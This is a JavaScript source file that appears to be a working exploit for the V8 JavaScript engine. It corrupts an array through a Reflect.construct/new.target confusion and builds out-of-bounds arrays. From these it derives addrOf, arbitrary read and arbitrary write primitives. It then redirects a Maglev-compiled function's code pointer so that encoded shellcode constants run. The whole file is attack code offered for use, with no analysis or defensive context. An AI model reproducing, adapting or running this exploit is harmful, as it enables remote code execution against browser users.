function searchDblArrIndex(startAddr, corruptedArr, marker1, marker2, limit) {
  var startIndex = getOffset(startAddr);
  var end = getOffset(limit);
  var addr = startAddr;
  for (let idx = startIndex; idx < end; idx += 1) {
    if (corruptedArr[idx] == 0x40504000/2 && corruptedArr[idx + 2] == 0x40508000/2) {
      return idx - 3;
    }
    addr += 4;
  }
}

function searchObjArrIndex(startAddr, corruptedArr, limit) {
  var startIndex = getOffset(startAddr);
  var end = getOffset(limit);
  for (let idx = startIndex; idx < end; idx += 1) {
    if (corruptedArr[idx] == 0x414141 && corruptedArr[idx + 1] == 0x424242) {
      return idx - 2;
    }
  }
}


function addrOf(obj, dblOffset) {
  oobObjArr[0] = obj;
  var addrDbl = oobDblArr[dblOffset];
  return ftoi32(addrDbl)[0];
}

function read(addr, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 2);
  var out = ftoi32(oobDblArr2[0]);
  oobDblArr[dblArrOffset] = oldValue;
  return out;
}

function write(addr, val1, val2, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 2);
  oobDblArr2[0] = i32tof(val1, val2);
  oobDblArr[dblArrOffset] = oldValue;
  return; 
}

class A {}

var gcSize = 0x4fe00000;

//version dependent
//Address of corruptedArr, serves as starting point of search, does not need to be too accurate
var arrAddr = 0x42191;
var emptyAddr = 0x219;

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);
var bigIntView = new BigInt64Array(view);

function func() {
  return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 2.6348604765229606e-284];
}
for (let i = 0; i < 1000; i++) func(0);

var x = Array;

class B extends A {
  constructor() {
    x = new.target;
    super();
  }
}
function construct() {
  var r = Reflect.construct(B, [], x);
  return r;
}

for (let i = 0; i < 2000; i++) construct();

new ArrayBuffer(gcSize);
new ArrayBuffer(gcSize);

corruptedArr = construct();
corruptedArr = construct();

function getOffset(addr) {
  return (addr - emptyAddr)/4 - 2;
}

function indexToAddr(idx) {
  return (idx + 2) * 4 + emptyAddr;
}

function ftoi32(f) {
    dblArr[0] = f;
    return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
    intView[0] = i1;
    intView[1] = i2;
    return dblArr[0];
}

function itof(i) {
    bigIntView = BigInt(i);
    return dblArr[0];
}

function ftoi(f) {
    dblArr[0] = f;
    return bigIntView[0];
}

//Use 1.5 so double representation can be interpreted as SMI to avoid deref crash
var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
var oobDblArr2 = [0x41, 0x42, 1.5];
var oobObjArr = [view, 0x424242];
oobObjArr[0] = 0x414141;

var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, 0x40504000/2, 0x40508000/2, arrAddr + 0x1000);

corruptedArr[dblIndex + 3] = 1;

let dblAddr = indexToAddr(dblIndex);
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x1000);
console.log("oobDblAddr: " + indexToAddr(dblIndex).toString(16));
var oobDblIndex = dblIndex;
corruptedArr[dblIndex + 3] = 0x41;
if (dblIndex == null || oobDblArr[0] == 0x41) {
  console.log("cannot find dblIndex");
} else {
  corruptedArr[dblIndex - 3] = 0x100;
  console.log("oobDblArr new length: " + oobDblArr.length);
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
  dblAddr = indexToAddr(dblIndex + 10);
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
  console.log("oobDblAddr2: " + indexToAddr(dblIndex).toString(16));
  var oobDbl2Index = dblIndex;
  let objIndex = searchObjArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
  console.log("oobObjAddr: " + indexToAddr(objIndex).toString(16));
  var funcAddr = addrOf(func, (objIndex - oobDblIndex) >> 1);
  console.log("func Addr: " + funcAddr.toString(16));
  var dblOffset = (oobDbl2Index - oobDblIndex - 5) >> 1;
  var codeAddr = read(funcAddr + 0x10, dblOffset)[0];
  console.log("code Addr: " + codeAddr.toString(16));
  var maglevAddr = read(codeAddr + 0x8, dblOffset);
  console.log("maglev Addr: " + maglevAddr[0].toString(16) + " " + maglevAddr[1].toString(16));
  write(codeAddr + 0x8, maglevAddr[0] + 0x80 + 2, maglevAddr[1], dblOffset);
  func();
}
